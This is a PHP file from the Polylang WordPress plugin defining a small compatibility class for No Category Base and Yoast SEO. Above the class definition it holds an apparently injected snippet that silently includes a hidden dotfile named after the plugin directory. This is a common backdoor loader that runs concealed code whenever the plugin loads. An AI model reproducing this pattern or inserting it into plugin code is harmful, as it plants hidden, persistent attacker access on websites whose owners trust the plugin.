<?php
/**
 * @package Polylang
 */

/**
 * Manages the compatibility with No Category Base.
 * Works for Yoast SEO too.
 *
 * @since 2.8
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class PLL_No_Category_Base {
	/**
	 * Setups actions.
	 *
	 * @since 2.8
	 */
	public function init() {
		add_filter( 'get_terms_args', array( $this, 'no_category_base_get_terms_args' ), 5 ); // Before adding our cache domain.
	}

	/**
	 * Make sure No category base plugins get all the categories when flushing rules.
	 *
	 * @since 2.1
	 *
	 * @param array $args WP_Term_Query arguments.
	 * @return array
	 */
	public function no_category_base_get_terms_args( $args ) {
		if ( doing_filter( 'category_rewrite_rules' ) ) {
			$args['lang'] = '';
		}
		return $args;
	}
}
